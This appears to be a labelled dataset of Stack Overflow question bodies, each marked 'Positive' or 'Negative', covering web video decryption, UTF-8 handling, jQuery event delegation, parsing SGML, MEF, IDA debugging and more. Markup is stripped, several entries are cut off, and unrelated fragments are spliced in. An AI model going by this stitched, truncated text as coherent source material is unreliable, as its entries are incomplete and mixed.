Positive 53669 pI was very hesitant to post this, but Ive searched and searched and found nothing that works, its driving me mad.

I also tried creating another video div thinking it would stick if there was one to the right of it, but this just made the div jump down while the three other divs stayed where they should.p  pI dont entirely understand the code on my responsive site, I just borrowed a lot of ideas and code and then customized it and did a lot of research on specific topics, then tried different code until it worked.

I found a solution to every other issue by searching this site, so I really appreciate Stack Overflow.p  pTried the W3 Validator for any clues, but it didnt offer any help, the only thing is it didnt like my using percentages for image width which is necessary for responsive sites.

Positive 53669 pLets say I have an MP4 file on a remote server thats encrypted i. e. is in some format that cannot be immediately used as the src in an HTML 5 VIDEO tag.  p  pI want JavaScript code that will be able to fetch that file, decrypt it assuming I have the JavaScript code to do so, and then have it play using the VIDEO tag, WHILE the file is being decrypted i. e. as opposed to reading the whole file into an array, processing it, and then creating a blob URL for it thats later assigned as the src to the VIDEO tag. p  pThe problem is that the HTML 5 VIDEO tag only accepts a filename or blob URL as the SRC.  So my question, essentially, is if theres anyway I can specify a stream URL to be the VIDEO src, and then access that stream i. e. via an Event and then within that event, add data to that stream incrementally.p  pIve researched the JavaScript MediaStream API, but dont see anyway I can use it to add processed data i. e. a portion of a decoded stream to the stream as described above.p  pIf this CANNOT be done, Im assuming I need a JavaScript video player that can read an encrypted file and render it to an HTML 5 CANVAS as its being decrypted.

That way books on similar subjects will tend to be near each other, for example, if you know youre looking for a book about accounting, all you have to do is find SOME book about accounting and youll see the other half dozen that we have right next to it which makes it convenient to browse the library.p  pThere seem to be lots of web APIs to do this, including Amazon and the Library of Congress.

Negative 53669 pIm whiling to add a support of Server Side events to a hrefhttpcppcms.sourceforge.net relnofollowCppCMSa. I understand the technical part of what to do on the level of communication Client sends long polling XmlHTTPRequest, and waits for respond, server accepts the connection and does not respond until server side event occurs and sends the response to the client. The client repeats the procedure.p  pHowever, this is too low level for most of web developers. There are many questions how do I manage events, how do I manage connections and so on.p  pI thought about two possible modelsp  ol lipThere are some named events defined and the server side, for example New Message in Chat Room no 134 when the request accepted the server side application checks the messages in the room  for example in DB and if there is no new messages for the client it subscribes to event and waits on it.p  pWhen some other client posts data to the server, it notifies all applications on the New Message in Chat Room no 134 event and they wake up and send these messages to clients, and so on.p  pThis model is still looks like quite low level model, but it hides all notification methods.pli lipAnother option is to define some named queues, so each client creates such queue upon connection to server and waits for new messages. When some client posts a new message to Chat Room no 134, on the server side it is broadcasted to all queues connected to this Chat Room no 134, and the message is delivered to client.p  pHowever there are many questions that are risenp  ul liHow do I manage queues and the session level, at the level of single pageli liHow do I delete queues and create timeouts on themli liWhat happens if more then one window subscribes to same queueli ulli lipCreate a persistent object on server side that glues between server side events and user side events. It may communicate over distinct XHR requests that are redirected to it.p  pSo client JavaScript registers events and waits for them with XHR and server side dispatched event notifications, until the page is rebuild.pli ol  pSo, I would like to know, what are most popular and recommended  API models behind server side push technologiesp  pThanksp  pstrongEditstrong Added third optionp

Negative 53669 pHow can I get JTextFields to allow kbdCtrlkbdkbdDeletekbd and kbdCtrlkbdkbdBackspacekbd when editing textp  pIn various other programs, these key combinations can delete an entire word in one go.p  pFrom what I can tell, the default behaviour of a JTextField allows the user to use kbdCTRLkbd to jump over an entire word when using left and right keys, and to select an entire word when kbdSHIFTkbd is used too. However, deleting just doesnt work.p
Negative 53669 pI am aware that there are been various questions about utf8, mainly about libraries to manipulate utf8 string like objects.p  pHowever, I am working on an internationalized project a website, of which I code a c backend... dont ask where even if we deal with utf8 we dont acutally need such libraries. Most of the times the plain stdstring methods or STL algorithms are very sufficient to our needs, and indeed this is the goal of using utf8 in the first place.p  pSo, what I am looking for here is a capitalization of the emQuick amp Dirtyem tricks that you know of related to utf8 stored as stdstring no const char, I dont care about cstyle code really, Ive got better things to do than constantly worrying about my buffer size.p  pFor example, here is a emQuick amp Dirtyem trick to obtain the number of characters which is useful to know if it will fit in your display boxp  precodeinclude ltstringgt include ltalgorithmgt   Lets remember than in utf8 encoding, a character may be  1 byte 0.......  2 bytes 110..... 10......  3 bytes 1110.... 10...... 10......  4 bytes 11110... 10...... 10...... 10......  Therefore 10...... is not the beginning of a character   const unsigned char mask  0xC0 const unsigned char notUtf8Begin  0x80  struct Utf8Begin    bool operatorchar c const  return c amp mask  notUtf8Begin     Lets count sizet countUtf8Charactersconst stdstringamp s    return stdcountifs.begin, s.end, Utf8Begin  codepre  pIn fact I have yet to encounter a usecase when I would need anything else than the number of characters and that stdstring or the STL algorithms dont offer for free sincep  ul lisorting works as expectedli lino part of a word can be confused as a word or part of another wordli ul  pI would like to know if you have other comparable tricks, both for counting and for other simple tasks.br  I repeat, I know about a hrefhttpsite.icuproject.orgICUa and a hrefhttputfcpp.sourceforge.netUtf8CPPa, but I am not interested in them since I dont need a fullfledged treatment and in fact I have never needed more than the count of characters.br  I also repeat that I am not interested in treating chars, they are oldfashioned.p

Negative 53669 pI got an email a few days ago from someone who was having trouble building a Delphi project I have on Google Code.  The project file and one of the DFM files were munged after he updated with some changes I had checked in.  We talked back and forth a bit, and traced it down to what he said was SVN throwing in extra stuff.  He deleted the files and ran Update again and it worked fine.p  pIve never seen this problem before, and I wasnt able to reproduce or verify any of it at my end.  There werent any update conflicts with other users, since Im the only one with write access to the repository.  So Im wondering what could have caused this.

Negative 53669 pIve written a C DLL that connects to a Sybase database using the native C library for Sybase. I can build and run the program on my C drive, and others can run it from their C drives, and everything works. But in some situations both my DLL and the Sybase DLL are located on the F drive instead of the C drive. In those cases my DLL apparently fails to load the Sybase DLL.p  pIm a little unclear on how linking works, but based on my incomplete understanding my best guess is that the Cdrive location of the DLL is what gets built into the final DLL, which is what causes it to fail when it runs from a different drive letter. Does that sound like a reasonable explanation Any other reasons my DLL would fail to load the Sybase DLL when run from a different drive letter Any idea how I can resolve thisp  pstrongEDITstrong Turns out this was the wrong question, but it led me in the right direction. The Sybase DLL uses an ini file to determine database connection details, and I had the path for that hardcoded to the C drive.p

At the moment I am doing the followingp  precodeusing MyEntitiesContext aCtx  new MyEntitiesContext      var aQuery  from c                  in aCtx.Client                  where c.ClientID1                  select c      Client aClient  aQuery.FirstOrDefault      bool Exists  aClientnull     ...  codepre  pBut if I am not wrong this loads the full Client object from the database if the Client exists. I am actually only interested whether it exists or not without loading the object.p  pSQL has the codeSELECT COUNT...code construct. Is there something similar I can do with LINQp  pThank you for advicep

Negative 53669 pHeres an interesting question about the various quirks of the C language. I have a pair of functions, which are supposed to fill an array of points with the corners of a rectangle. There are two overloads for it one takes a codePoint[5]code, the other takes a codePoint[4]code. The 5point version refers to a closed polygon, whereas the 4point version is when you just want the 4 corners, period.p  pObviously theres some duplication of work here, so Id like to be able to use the 4point version to populate the first 4 points of the 5point version, so Im not duplicating that code. Not that its much to duplicate, but I have terrible allergic reactions whenever I copy and paste code, and Id like to avoid that.p  pThe thing is, C doesnt seem to care for the idea of converting a codeT[m]code to a codeT[n]code where coden lt mcode. codestaticcastcode seems to think the types are incompatible for some reason. codereinterpretcastcode handles it fine, of course, but is a dangerous animal that, as a general rule, is better to avoid if at all possible.p  pSo my question is is there a typesafe way of casting an array of one size to an array of a smaller size where the array type is the samep  p[Edit] Code, yes. I should have mentioned that the parameter is actually a reference to an array, not simply a pointer, so the compiler is aware of the type difference.p  precodevoid RectToPointArrayconst degRectamp rect, degPointamppoints[4]      points[0].lat  rect.nw.lat points[0].lon  rect.nw.lon     points[1].lat  rect.nw.lat points[1].lon  rect.se.lon     points[2].lat  rect.se.lat points[2].lon  rect.se.lon     points[3].lat  rect.se.lat points[3].lon  rect.nw.lon  void RectToPointArrayconst degRectamp rect, degPointamppoints[5]       I would like to use a more typesafe check here if possible     RectToPointArrayrect, reinterpretcastltdegPointamp[4]gt points     points[4].lat  rect.nw.lat points[4].lon  rect.nw.lon  codepre  p[Edit2] The point of passing an arraybyreference is so that we can be at least vaguely sure that the caller is passing in a correct out parameter.p
Negative 53669 pIs there any way to prevent a click from an codeltagtcode triggering delegated click handlers on its parent, while allowing the the codeltagtcodes default behavior to occur navigating to the codehrefcode.p  pHeres an example that illustrates what Im asking.p  precodeltdiv classtopgt     ltdiv classmiddlegt         lta hrefgoogle.com classlinkgtlinkltagt     ltdivgt ltdivgt codepre  pAnd my JavaScriptp  precode.top.delegate.middle, click, functionevent     alertfailure   .top.delegate.link, click, functionevent        codepre  pIn this case, I want to be navigated to google.com when I click the link, but must NOT see the codealertfailurecode on my way out.p  pThere are a few restrictions to the solutionp  ol liAll event handlers must be delegated off of code.topcode, as I potentially have thousands of these in the page.li liThe navigation must be accomplished using browser default behavior, rather than codewindow.location  this.attrhrefcode or similarli ol  pUsing normal event binding, I could do an codee.stopPropagationcode in a click handler for the codeltagtcode, but that wont work due to the nature of delegation.  jQuery provides another method called code.stopImmediatePropagationcode that describes what I want preventing other handlers on current element, in this case the element that holds the delegated handlers, but does not actually accomplish it in this case. That might be a bug in code.delegatecode, Im not sure.p  pReturning codefalsecode from the codeltagtcodes click handler will prevent the other handler from running, but will also do a code.preventDefaultcode, so the browser will not navigate.  Basically, Im wondering what codereturn falsecode does that codee.stopImmediatePropagation e.preventDefaultcode does not.  Based on the docs, they should be equivalent.p  pFor a live demo of the above code, heres a jsFiddle a hrefhttpjsfiddle.netCHn8x relnofollowhttpjsfiddle.netCHn8xap

Negative 53669 pFollowing join is supposed to retrieve user info along with their messages for users with a certain statusp  precodeSELECT  FROM user, message WHERE message.useriduser.id AND user.status1 codepre  pThe problem is that all rows about a certain user in the result set contain redundant columns that repeat the same data about that user those fields retrieved from user table, only fields from the message table contain nonredundant information.

Loops that cause microqueries should be avoided at all costs. p  pI am not concerned about the output of my program, that is well handled in the UI. I emthinkem perhaps the network traffic produced by returning the result of this query could be substantially reduced if somehow I can manage to eliminate the repetition of user data in all rows pertaining to that user.p

Negative 53669 pIm in the process of creating my first rails plugin and am finding managing version control of the plugin and testing app rather annoying.p  pHeres my problemp  pTo actually test my plugin in action I need to run it within a test application which is basically just a scaffold app where I install the pluginp  pWhen Im making changes to the plugin, its convenient for me to change it within the test application so i can immediately see the changes come through.

Negative 53669 pIm reading about compilers and parsers architecture now and I wonder about one thing... When you have XML, XHTML, HTML or any SGMLbased language, strongwhat would be the role of a emlexerem here and what would be the tokensstrongp  pIve read that tokens are like emwordsem prepared for parsing by the emlexerem. Although I dont have problem with finding tokens for languages line C, C, Pascal etc., where there are keywords, names, literals and other wordlike strings separated by whitespace, with XML i have a problem, because there arent any words Its only plain text interleaved with the markup tags.p  pI thought to myself that it could be that these tags and plain text fragments are the tokens, something like that code[TXT][TAG][TAG][TXT][TAG][TXT][TAG][TAG][TXT]...code. It would be quite reasonable, since SGML doesnt care whats inside the markup delimiters codeltcode and codegtcode well, it recognizes special processing instructions and definitions when it founds codecode or codecode as the next character comments belong to that group too, and the SGML tokenizer could be a base for the XMLHTMLXHTML parser.p  pBut then I realized that there can be codeltcode characters stuffed inside the markup as a part of other syntax attribute values   Even if its not quite good idea to put codeltcode characters inside attribute values its better to use codeampltcode for that, many browsers and editors deal with that and treat these codeltcode as a part of the attribute value, not a tag delimiter.p  pIt complicates things a bit, because I dont see a way to  recognize markup like that by a simple Deterministic Finite Automaton DFA in the lexer. It looks like it requires a separate context for the automaton when its inside the tag, and another context when it encounters an attribute value. This would need a stack of statescontexts I think, so DFA might not handle that. Am I rightp  pWhats your view Is it good to make tokens from tags markup and plain textp  pHere a hrefhttpwww.antlr.orgwikidisplayANTLR3ParsingXMLhttpwww.antlr.orgwikidisplayANTLR3ParsingXMLabr is used some kind different technique they treat codeltcode and codegtcode and also codeltcode and codegtcode as separate tokens, and inside the tags they use codeGENERICIDcode as a token etc.They generally move most of the work to the parser. But they also have to change contexts for the tokenizer they use different context in the plain text, and different in markup but they forgot about attribute values context I think, because first occurence of codegtcode will end the tag in their lexer.p  pSo whats the best approach for parsing SGMLlike languages Is the lexer really used there If yes, what strings constitute the tokensp

Negative 53669 pIve read about how a hard job in programming is writing code at the right level of abstraction.

Negative 53669 pOne of my friends raised this problem to me. I was stuck because I am not an adept at using exceptions. Keep in mind that we both work in an working environment where we use C but do error handling in C tradition. His problem was something like thisp  pFunction codeAcode calls codeBcode which in turn calls codeCcode. An exception is thrown from codeCcode and the catch block for that exception is in codeAcode. What happens to resources acquired in codeBcode before the call to codeCcode How do we clean those up My answer was use RAII. But even when I said it, I knew it wasnt gonna work. We have huge code bases that have been written in the C mode. Nowhere in code have I seen auto pointers and such. Resources arent necessarily wrapped up in classes. Even when they are, the destructors are left for the compiler in most cases. In short, everything is done manually.p  pThe real problem is what to do to make the transition from C error handling to exceptions with the weight of a huge code base The problem my friend asked is just one of the possible questions that can be raised when you have your feet grounded in C error handling and want to know how the migration from there to exceptions can occur.p

What this means is I now have a cat and mouse situation.p  pIve now solved this by using codeLazyltTgtcode on imports which affected the chaining to occur, however if another implementer of a part forgets to use codeLazyltTgtcode it may trigger a chained load and cause the app to fail.p  pWhat have others used to overcome scenarios such as thisp  pPreviously I had unity which I controlled in a more manual way by simply using codeRegisterInstanceltTgtT tcode, Ive trying to now write apps using the official MEF as this comes with the framework and I no longer need to worry about unity.p  pIdeally what Id like to be able to do is.p  ol liCreate parts manually at startup prior compositionli liCreate a composition container manually adding my prebuilt parts like codeRegisterInstanceltTgtT tcode in unityli liFind remaining parts using the usual methods of composition shown in the docs.li ol

Negative 53669 pIm developing a java application, using a 32Bit native library which Im accessing via JNA. On MacOS X Snow Leopard its possible to pass the parameter d32 to the JVM, which causes the JVM to start in 32Bit mode. Ive got a launcher application, which sets some environment variables and then starts the main application. This is also the place where it is decided to launch the main application with the d32 switch, if the program is executed on MacOS.p  pSo heres my question Is there a similar way to solve this on Windows or Linuxp  pIt would be the best if it was possible to run the 64Bit JVM in 32Bit mode. But Im not really afraid to tell my users to install an additional 32Bit JVM, thats not the problem. The problem is, that I would have to tell my launcher application where the 32Bit JVM can be found, as the first one in the PATH variable could be the 64Bit one.p  pThanks in advance,p  paRestlessp

Negative 53669 pIm trying to sift through the myriad of test solutions out there, and Im not even sure if Im headed the right direction. The story is were running a RESTful Web service, implemented as a Rails app, which backs our mobile clients. Were unit testing the Web service of course, but that involves mocking out many parts of the application, for instance, the search stack Apache SOLR.p  pMoreover, our tests dont i.e. cannot cover critical routes such as the mobile signinsignon process, since that involves communication between the API application and the mobile website, where the user can enter credentials, e.g. for SSO Janrain Engage. Hence, a standard Rails integration test wont do.p  pI realize that in theory, if the test suite is very well designed, where mocking only happens strictly at the those join points where the tests for the next layer start, then by unit or functional testing the service API and the mobile website separately, one could get the same test coverage. I find that in practice though, this is an illusion if you have several developers working on the test suite independently I just admit that our unit tests are simply not that well designed. Particularly when exercising TDD I found that while the tests can drive the application code, the test code design is only tailored to the unit under test, resulting in a rather wildly grown test suite.p  pAnother thing I found is that sometimes we didnt detect regressions purely using unit tests, where e.g. bad queries were sent to the SOLR server due to knockon effects. Thats why I thought the only true way to ensure that the entire stack works along the critical routes is to automatically endtoend test it on a staging server before every deployment, i.e. having actual HTTP requests sent to the app.p  pMy questions would bep  ul lido you think this is a reasonable thing to do at all I found very little information about endtoend testing a live API on the Web, leaving me wondering whether Im making any sense at allli liwhich toolssetup would you suggest We use Watir to run acceptance tests for our website, but it seems to be overkill for a Web service no browser environment needed, no JS or anything UIish.

Negative 53669 pHeres what I havep  ul liA web application that runs in a single HTML page call it codemyapp.reqcode, with content coming and going via AJAXli liThe application can be entered externally with a link such as codemyapp.reqid123code, and the application opens a tab with the item at id 123li liThe content on the page is mostly users content, and many times has innerapplication links to codemyapp.reqid123codeli liThe problem is that clicking a link to codemyapp.reqid123code reloads the browser, and removes any content or state that the user had loadedli ul  pWhat I want is to be able to catch link clicks whose destination is codemyapp.reqid123code, and instead of reloading the page, just open the tab for item 123, leaving anything else currently loaded alone.  If the link is for an external website, though, obviously just let the browser leave.p  pSo my question really Can I have a global link handler that checks if I want to handle the link click, and if so, run some javascript and dont leavep  pI understand I could find all codeltagtcodes and add listeners, but my hope is that the solution would only require setting up the listener once, and not adding link handlers every time new content is loaded on the page.  Since content can be loaded many different ways, it would be cumbersome to add code to all those places.p  pDoes that make sense  Thanks for any help or suggestionsp

Negative 53669 pI try to analyze a dll file with my poor assembly skills, so forgive me if I couldnt achieve something very trivial. My problem is that, while debugging the application, I find the code Im looking for only in debug session, after I stop the debugger, the address is gone. The dll doesnt look to be obfuscated, as many of the code is readable. Take a look at the a hrefhttpsdl.dropbox.comu3055964ida.png relnofollowscreenshota. The code Im looking for is located at address 07D1EBBF in debug376 section. BTW, where did I get this debug376 sectionp  pSo my question is, How can I find this function while not debugging Thanksp  pUPDATEp  pOk, as I said, as soon as I stop the debugger, the code is vanished. I cant even find it via sequence of bytes but I can in debug mode. When I start the debugger, the code is not disassembled imediately, I should add a hardware breakpoint at that place and only when the breakpoint will be hit, IDA will show disassembled code. take a look at this a hrefhttpsdl.dropbox.comu3055964ida2.gif relnofollowscreenshota You see the line of code Im interested in, which is not visible if the program is not running in debug mode. Im not sure, but I think its something like unpacking the code at runtime, which is not visible at design time.p  pAnyway, any help would be appreciated. I want to know why that code is hidden, until breakpoint hit its shown as db 8Bh etc and how to find that address without debugging if possible. BTW, could this be a code from a different module dllp  pThanksp  pUPDATE 2p  pI found out that debug376 is a segment created at runtime. So simple question how can I find out where this segment came from p

The images themselves are on transparent backgrounds and Ive created an array of the pixels in the images which contain a point and are not transparent or white.p  pNow, my question is how do I draw an accurate polygon around the outer edge points Ive used a a hrefhttpwww.aforgenet.com relnofollowGraham Scan algorithma that I read about to create a convex hull around the edges but this doesnt seem to work for objects with concavities. For examplep  pa hrefhttpi48.tinypic.com4s0lna.png relnofollowhttpi48.tinypic.com4s0lna.pngap  pThe image on the left gets filled in using this method with the one on the right. As you can see, its filling in a little too much.p  pI assume there must be some emotherem algorithm or approach that can be used to solve this, but Im not sure of where to look or what it might be called. Could anyone point me in the right direction Im using C.net and hopefully there might be something that already exists which could work along these lines.p

Negative 53669 pLets assume I have several signal generators, each signal generator has a specific frequency. For example, Generator A generates number 3 every 3 seconds, Generator B generates number 4 every 5 seconds, etc. p  pI dont know how many signal generators there are, neither do I know their frequency or generated numbers. But I do have a stream of timestamps and numbers of all these generators produce. Of course the timestamps may be off by a bit, for example I might see Generator A generates 3 at 0.5, 3.51, 6.49, etc. The signals might also be off  I might see 2.99, 3.01. We can assume they are not off by a lot. Not all numbers in the stream are generated by a fixedfrequency signal generator. p  pAre there any existing algorithms I can use, to find out the generators behind the stream I dont expect to find all the generators, but I would like to have as many as possible. p  pThanks p

Negative 53669 pIm building a ruby recipe management application, and as part of it, I want to be able to parse ingredient quantities into a form I can compare and scale. Im wondering what the best tools are for doing this.p  pI originally planned on a complex regex, then on some other code that converts human readable numbers like codetwocode or codefivecode into integers, and finally code that will convert say code1 cupcode and code3 teaspoonscode into some base measurement. I control the input, so I kept the actual ingredient separate. However, I noticed users inputing abstract measurements like codeto tastecode and code1 packagecode. At least with the abstract measurements, I think I could just ignore them and scale and just scrape any number preceding them.p  pHere are some more examplesp  pre classlangnone prettyprintoverridecode1 tall can 14 cup 2 Leaves 1 packet To Taste One Two slices 34 fillets Halfbunch 2 to 3 pinches optional codepre  pAre there any tricks to this I have noticed users seem somewhat confused of what constitutes a quantity. I could try to enforce stricter rules and push things like codetall cancode and codeleavescode into the ingredient part. However, in order to enforce that, I need to be able to convey whats invalid.p  pIs there an api or gem I could use  WolframAlpha looked promising at first, but ultimately, I dont think it will work unless I can tell them Im only feeding them recipe quantities.p  pIm also not sure what the base measurement I should convert quantities into.p  pEDIT Just to clear up any confusion, these are my goals.p  ol lipstrongTo be able to scale recipes.strong  Arbitrary units of measurement like codepackagescode dont have to be scaled but precise ones like codecupscode or codeouncescode need to be.pli lipstrongFigure out the main ingredients.strong  In the context of this question, this will be done largely by figuring out what the largest ingredient is in the recipe.

Negative 53669 pMy Spring MVC web app has a navigation menu at the top of the page with links to a list of items. The list of items is retrieved from the database. This menu is common to all pages in the application. Currently, in every controller, I retrieve and store the list of items in session if not already in session, so that it is available on every page. It works fine, but I feel this there should be a better way to do this. To avoid this redundancy, I am now trying to use a HandlerInterceptorAdapter. I am able to get it work, but not perfectly. The first time I load the page, I do not see the object I set in session. But, if I refresh the page, I do see the object in session.p  pI created my interceptor this wayp  precodepublic class MyHandlerInterceptor extends HandlerInterceptorAdapter    private MyService myService    Constructor   public MyHandlerInterceptorMyService myService          this.myService  myService       Overridden method   public void postHandleHttpServletRequest request,                           HttpServletResponse response,                           Object handler,                           ModelAndView modelAndView throws Exception      System.out.printlnIn posthandle...      if request.getSession.getAttributeitems  null        request.getSession.setAttributeitems, myService.getCategories          codepre  pI declared the interceptorp  precodeltmvcinterceptorsgt   ltbean classcom.gyanify.webapp.interceptors.MyHandlerInterceptor         autowireconstructorgt ltmvcinterceptorsgt codepre  pI am checking if the object is set in session by the time the jsp rendersp  precode...

Negative 53669 pQuestion on SignalR cross domain. I have the following layers in my .NET applicationp  ul liDatali liDALli liService using WCFli liClientWeb1 cw1li liClientWeb2 cw2li ul  pThe reason for the Service layer is to act as a middle man between the SignalR hubs on cw1  cw2. p  pThe goal being cw1 will send some kind of update message to its controller, this then updates cw1s hub which then broadcasts it to all cw1s standard signalr functionality.p  pWhat I need also is for cw1s controller to send an additional message to my service layer so that cw2 clients also learn of the update from cw1. At this point I want my service layer to be able to call cw2s hub and fire a message to all cw2s clients based off of cw1s initial message.p  pSo my question is this How do I gain access to either cw1s or cw2s hubs from an external service layer Is this possible I believe it is but cannot seem to find a best answer due to numerous deprecated SignalR functions.p
Negative 53669 pI want to write a class QObjectderived that can wait for someone calling a specific function.

In codesetDonecode, unlock the mutex, and in codewaitForFinishedcode use a wait condition to wait for the mutex to get unlocked. I never used codeQWaitConditioncode, so I dont know if this does what I want.p
Negative 53669 pWe are standardizing our infrastructure for Android development and we are trying to incorporate dependency management to our Android library projects. My current track is using the maven android plugin with a hrefhttprgladwell.github.comm2eandroidm2eandroida. We have uploaded the Android artifacts to our Artifactory repository with the a hrefhttpsgithub.commosabuamavenandroidsdkdeployerAndroid SDK Deployera. We also have an internal framework with a few libraries we can import into our projects and for most part it works fine.p  pThe issue we are facing now is that apklib dependencies containing resource files are hard to set up. The maven plugin can correctly configure the classpath but if the apklib has resource files that needs to be referenced by the parent Android project, Eclipse is unable to find them unless you checkout the Library Project and link it to the parent project through ADT.p  pAfter reading m2eandroid discussion on issue a hrefhttpsgithub.comrgladwellm2eandroidissues8httpsgithub.comrgladwellm2eandroidissues8a, a hrefhttpstackoverflow.comquestions6269816creatingclosedsourceandroidlibrariesanswer6270768Creating Closed Source Android Librariesa and a hrefhttpstackoverflow.comquestions8831481apklibdoesnotgetinstalledinmavenrepoAPKLIB does not get installed in Maven Repoa, Im not convinced maven is the way to go until ADT properly support closed source apk libraries.p  pId like to know how are you handling these kind of dependencies on your Android projects.

Negative 53669 pI have been running into issues with the chrome autofill behavior on several forms. p  pThe fields in the form all have very common and accurate names, such as email, name, or password, and they also have autocompleteoff set. p  pThe autocomplete flag has successfully disabled the autocomplete behavior, where a dropdown of values appear as you start typing, but has not changed the values that Chrome autopopulates the fields as. p  pThis behavior would be ok except that chrome is filling the inputs incorrectly, for example filling the phone input with an email address. Customers have complained about this, so its verified to be happening in multiple cases, and not as some some sort of result to something that Ive done locally on my machine. p  pThe only current solution I can think of is to dynamically generate custom input names and then extract the values on the backend, but this seems like a pretty hacky way around this issue. Are there any tags or quirks that change the autofill behavior that could be used to fix thisp

Negative 53669 pI am looking for some information on best practices when using the passport local strategy. I went though the local strategy example that uses an authToken, for login persistence, found on github. When speaking with a coworker, they posed the question, how is storing this token in a session cookie any more secure than storing a password because its essentially your authenticated identity on the server.  So how do i answer this question Its a green question, i admittedly dont fully understand the entire lifecycle. So how is this a safe solution when integrated with bccrypt and mongo like the example is. And if it was merely an example and not necessarily meant to show a robust solution, what are some best practices to keep our users and our application safep  pa hrefhttpsgithub.comjaredhansonpassportlocaltreemasterexamplesexpress3mongooserememberme relnofollowhttpsgithub.comjaredhansonpassportlocaltreemasterexamplesexpress3mongooseremembermeap

Negative 53669 pI use a great tool for comparing folders and files called Araxis Merge.  It has saved my butt so many times through my career that I am forever thankful and I use it frequently.  I am aware that Araxis Merge has git integration from the command line but Id like to see if anybody has any insight on automating this specific workflow.p  pSo that I can easily stay on top of all changes I would like to be able to automatically compare every change that goes into a git repository easily using araxis merge folder compare.  My perfect workflow would be to pull the code and have it pop the compare on every pull automatically to show me what changed, regardless if a merge is required or not.  I dont want to manually merge stuff, I like the auto merge, I would just like a high level preview of every filefolder that changed before it does the merge or pulls in new code over the existing code.p  pAnybody have any ideas on how to automate something like this  Of course I could write a folder copying bash script that duplicates the source directory first and launches the folder compare after the pull finishes but I wanted to see if anybody has done something like this before with git andor araxis merge.p

Negative 53669 pI am trying to create an android app using acceleo using model driven approach. I could create a model with some help from acceleo guide.

Negative 53669 pI am trying to geocode data in one table A with address data contained in another table B.

Negative 53669 pIve seen there are quite a few questions about decimal precision and display in Javascript. the thing is that I came to a solution that I thought it was gonna be enough for mep  pThe key thing is that Im trying to parse to a string to round and then back to numbers using expressions like this.p  precodereturn parseFloatnum.toFixed2 codepre  pBut there are some cases that it doesnt work as expected. To be honest Im not sure if it has to do with the way Im using ko or the javascript code for parsing I put in place. But lets say that in the below fiddle you type 14.385 in the upper text box, both fields will be properly rounded and will display the correct number of decimals, but without deleting the number you add 3333 that means 14.393333 and the upper one wont be rounded. Thats just an example because there are some strange behaviours.p  pYo can see the fiddle here a hrefhttpjsfiddle.netRTexF relnofollowhttpjsfiddle.netRTexFap  pThanksp  pEdit.

Negative 53669 pSo, Ive been struggling with a frankly now infuriating problem all day today.p  pGiven a set of verticies of a triangle on a plane just 3 points, 6 free parameters, I need to calculate the area of intersection of this triangle with the unit square defined by 0,0 and 1,1. I choose this because any square in 2D can be transformed to this, and the same transformation can move the 3 vertices.p  pSo, now the problem is simplified down to only 6 parameters, 3 points... which I think is short enough that Id be willing to code up the full solution  find the full solution.p  p I would like this to run on a GPU for literally more than 2 million triangles every lt0.5 seconds, if possible. as for the need for simplification  no data structures  librariesp  pIn terms of my attempt at the solution, Ive... got a list of ways Ive come up with, none of which seem fast or ... specific to the nice case too general.p  pOption 1 Find the enclosed polygon, it can be anything from a triangle up to a 6gon. Do this by use of some intersection of convex polygon in On time algorithms that I found. Then I would sort these intersection points new vertices, up to 7 of them On log n , in either CW or CCw order, so that I can run a simple area algorithm on the points based on Greens function On again. This is the fastest i can come with for an arbitrary convex ngon intersecting with another mgon. However... my problem is definitely not that complex, its a special case, so it should have a better solution...p  pOption 2 Since I know its a triangle and unit square, i can simply find the list of intersection points in a more brute force way rather than using some algorithm that is ... frankly a little frustrating to implement, as listed abovep  pThere are only 19 points to check. 4 points are corners of square inside of triangle. 3 points are triangle inside square. And then for each line of the triangle, each will intersect 4 lines from the square eg. y0, y1, x0, x1 lines. that is another 12 points. so, 1234  19 points to check. Once I have the, at most 6, at fewest 3, points that do this intersection, i can then follow up with one of two methods that I can think of.p  p2a Sort them by increasing x value, and simply decompose the shape into its sub triangle  4gon shapes, each with an easy formula based on the limiting top and bottom lines. sum up the areas.p  por 2b Again sort the intersection points in some cyclic way, and then calculate the area based on greens function.p  pUnfortunately, this still ends up being just as complex as far as I can tell. I can start breaking up all the cases a little more, for finding the intersection points, since i know its just 0s and 1s for the square, which makes the math drop out some terms.. but its not necessarily simple.p  pOption 3 Start separating the problem based on various conditions. Eg. 0, 1, 2, or 3 points of triangle inside square. And then for each case, run through all possible number of intersections, and then for each of those cases of polygon shapes, write down the area solution uniquely.p  pOption 4 some formula with heaviside step functions. This is the one I want the most probably, I suspect itll be a little... big, but maybe Im optimistic that it is possible, and that it would be the fastest computationally run time once I have the formula.p  p Overall, I know that it can be solved using some high level library clipper for instance. I also realize that writing general solutions isnt so hard when using data structures of various kinds linked list, followed by sorting it. And all those cases would be okay, if I just needed to do this a few times. But, since I need to run it as an image processing step, on the order of 9  10241024 times per image, and Im taking images at .. lets say 1 fps technically I will want to push this speed up as fast as possible, but lower bound is 1 second to calculate 9 million of these triangle intersection area problems. This might not be possible on a CPU, which is fine, Ill probably end up implementing it in Cuda anyways, but I do want to push the limit of speed on this problem.p  pEdit So, I ended up going with Option 2b. Since there are only 19 intersections possible, of which at most 6 will define the shape, I first find those 3 to 6 verticies. Then i sort them in a cyclic CCW order. And then I find the area by calculating the area of that polygon. p  pHere is my test code I wrote to do that its for Igor, but should be readable as pseudocode  Unfortunately its a little long winded, but.. I think other than my crappy sorting algorithm shouldnt be more than 20 swaps though, so not so much overhead for writing better sorting... other than that sorting, I dont think I can make it any faster. Though, I am open to any suggestions or oversights I might have had in chosing this option. p  precodefunction calculateAreaUnitSquarexPos, yPos wave xPos wave yPos   First, make array of destination.

Negative 53669 pI have a fairly simple question that I cannot seem to find an answer for relating to C stdstring and how it is instantiated with new.  Now, I am well aware that any pointer returned from new should be subsequently deleted to prevent memory leak.  My question comes from what happens when an existing pointer is subsequently used to instantiate a new string object.  Please consider the following simplified examplep  precodechar foo      char ptr      ptr  new char[ARBITRARYVALUE]     ...     ptr  strncpysome null terminated string, ARBITRARYVALUE     ...     return ptr   int main       char buf     stdstring myStr      buf  foo     myStr  new stdstringbuf      ...do stuff      delete myStr     delete buf         Is this necessary     return 0  codepre  pstrongMy question is simple does deleting myStr also free the underlying memory used by buf or does buf need to be freed manually as wellstrong  If buf has to be freed manually, what happens in the case of anonymous parameters  As inp  precodemyStr  new stdstringfoo codepre  pMy suspicion is that the underlying implementation of stdstring only maintains a pointer to the character buffer and, upon destruction, frees strongthatstrong pointer but I am not certain and my C is rusty at best.p  pBonus question  How would this change if the class in question were something other than stdstring  I assume that for any user created class, an explicit destructor must be provided by the implementer but what about the 